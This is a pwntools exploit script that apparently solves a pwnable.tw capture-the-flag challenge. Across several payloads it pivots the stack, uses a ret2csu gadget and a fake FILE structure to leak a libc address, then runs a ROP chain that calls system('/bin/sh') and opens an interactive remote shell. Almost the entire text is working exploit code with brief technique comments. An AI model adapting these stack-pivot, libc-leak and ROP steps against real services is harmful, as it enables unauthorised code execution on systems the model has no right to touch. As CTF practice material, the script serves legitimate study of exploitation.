from pwn import *

context.arch = 'amd64'
context.os = 'linux'

io = remote('chall.pwnable.tw', 10402)

main_gets = 0x40053e
leave_ret = 0x400554
safe_area = 0x601400
fake_stack = 0x601800
libcsu_lower = 0x4005a0
libcsu_higher = 0x4005ba
fake_fp = flat([0xfbad2084, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0xffffffffffffffff])
fake_fp_addr = 0x601460

# pivot the stack to a predictable writable area
payload1 = b'A' * 0x10 + p64(fake_stack + 0x10) + p64(main_gets)
io.sendline(payload1)

payload2 = b'A' * 0x10 + p64(safe_area + 0x10) + p64(main_gets)
io.sendline(payload2)

# Create safe area so that gets function will not contaminate our payload
payload3 = b'A' * 0x10 + p64(0x601770) + p64(main_gets)
payload3 += p64(0x6017b0) + p64(main_gets)
payload3 += p64(0x6017c0) + p64(main_gets)
payload3 += p64(0x6017e0) + p64(main_gets)
payload3 += p64(0x601808) + p64(main_gets)
payload3 += fake_fp + b'/bin/sh\0'
io.sendline(payload3)
# Now, there are several libc addresses in the bss section of the binary.
# Our plan is to procure libc address by triggering _IO_file_write(fake_fp, predicable address which contains libc address, 0x8) using ret2libcsu.
# After obtaining an libc address, we can calculate system adderss, rop the binary, and get a shell.

# The feng shui
#0x601780:  libcsu higher addr                 rbx
#0x601790:                 rbp  0x00007f4cb1ec3ce4
#0x6017a0:                 r13                 r14
#0x6017b0:                 r15        libcsu lower
#0x6017c0:  xxxxxxxxxxxxxxxxxx  xxxxxxxxxxxxxxxxxx
#0x6017d0:            main rbp  xxxxxxxxxxxxxxxxxx
#0x6017e0:  xxxxxxxxxxxxxxxxxx  xxxxxxxxxxxxxxxxxx
#0x6017f0:  xxxxxxxxxxxxxxxxxx           main gets

fake_rbx = 0x6a76b
fake_rbp = fake_rbx + 1
fake_r13 = 0x8
fake_r14 = 0x601408
fake_r15 = fake_fp_addr

# write libcsu higher address & rbx & rbp
payload4 = b'A' * 0x10 + p64(safe_area + 0x20) + p64(leave_ret) + p64(libcsu_higher) + p64(fake_rbx) + p64(fake_rbp)
io.sendline(payload4)

# write r13 & r14
payload5 = p64(fake_r13) + p64(fake_r14) + p64(safe_area + 0x30) + p64(leave_ret)
io.sendline(payload5)

# write r15 & libcsu lower address
payload6 = p64(fake_r15) + p64(libcsu_lower) + p64(safe_area + 0x40) + p64(leave_ret)
io.sendline(payload6)

# write main rbp
payload7 = p64(0x601800) + b'A' * 8 + p64(safe_area + 0x50) + p64(leave_ret)
io.sendline(payload7)

# write main gets
payload8 = p64(main_gets) + b'A' * 0x8 + p64(0x601778) + p64(leave_ret)
io.sendline(payload8)

# leak libc address and calculate several necessary values for our rop gadget
libc_leak = io.recv(8)
libc_base = u64(libc_leak) - 0x3c38e0
log.info('libc base = ' + hex(libc_base))

system = libc_base + 0x45390;
pop_rdi_ret = libc_base + 0x21102;
shell_addr = 0x6014e0;

# classical ROP
payload9 = p64(0) + p64(pop_rdi_ret) + p64(shell_addr) + p64(system)
io.sendline(payload9)

io.interactive()
